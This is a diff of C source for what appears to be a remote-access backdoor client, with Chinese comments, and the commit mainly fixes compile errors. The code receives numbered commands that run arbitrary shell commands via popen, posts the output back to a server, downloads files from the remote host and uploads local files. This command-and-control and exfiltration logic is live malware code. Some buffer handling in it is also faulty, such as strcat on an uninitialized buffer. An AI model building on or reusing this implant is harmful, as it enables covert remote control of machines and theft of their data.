@@ -4,6 +4,7 @@
 #include<string.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include<WinInet.h>
 
 #include <curl/curl.h> 
 // 因為是另外引用的所以編譯的時候要用下面的格式
@@ -32,6 +33,7 @@ int main(){
     // 檢查是否存在 update.xml
     int xmlflag = isXMLexist();
     if(xmlflag == 0){
+        // printf("not exist update.xml\n");
         exit(EXIT_FAILURE);
     }
 
@@ -81,16 +83,17 @@ int main(){
     else{
         // 回傳格式是 cmdNum:result
         // 為了方便所以沒有做加密
+        FILE *fp;
+        char buffer[500];
+        int a;
         switch (cmdNum)
         {
         case 101:
             // 執行 arg shell 指令
-            FILE *fp;
-            char buffer[500];
             fp = popen(arg, "r");
             // 參考
             // https://www.cnblogs.com/hustquan/archive/2011/07/20/2111896.html
-            fget(buffer, sizeof(buffer), fp);
+            fgets(buffer, sizeof(buffer), fp);
             printf("%s\n", buffer);
             // 這邊做回傳通訊，回傳值是 buffer
             pclose(fp);
@@ -100,9 +103,10 @@ int main(){
         case 102:
             // 下載檔案，arg2 是遠端檔案路徑， arg1 是本地路徑
             // 方便起見 arg2 只給 /download/ 後面要接的內容好了
+            a = 1;
             char *switchTemp = strstr(arg, "|");
             int arg1Length = strlen(arg) - strlen(switchTemp);
-            char *arg1[100];
+            char arg1[100];
             strncpy(arg1, arg, arg1Length);
             char *arg2 = switchTemp + 1;
             sendGetDownload(arg1, arg2);
@@ -115,10 +119,8 @@ int main(){
 
         case 104:
             // 和 101 一樣
-            FILE *fp;
-            char buffer[500];
             fp = popen(arg, "r");
-            fget(buffer, sizeof(buffer), fp);
+            fgets(buffer, sizeof(buffer), fp);
             printf("%s\n", buffer);
             pclose(fp);
             sendPostRequest("104", buffer);
@@ -169,7 +171,7 @@ int getComputerInfo(){
 size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data) {
     // 計算實際接收到的數據大小
     size_t realsize = size * nmemb;
-    
+
     // 將接收到的數據附加到 data 變數中
     strncat(data, ptr, realsize);
     return realsize; // 返回實際寫入的字節數
@@ -249,7 +251,7 @@ void sendPostRequest(char *cmdNum, char *cmdResult){
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
         // 設置要發送的 POST 數據
-        char *postData[150];
+        char postData[150];
         strcat(postData, "{\"");
         strcat(postData, cmdNum);
         strcat(postData, ":");
@@ -347,7 +349,7 @@ void sendPostFileUpload(char *arg){
     /* to get the file size */
     if(fstat(fileno(fd), &file_info) != 0){
         fprintf(stderr, "File upload failed: cannot count the file size\n");
-        return 1; /* cannot continue */
+        return; /* cannot continue */
     }
 
     curl = curl_easy_init();
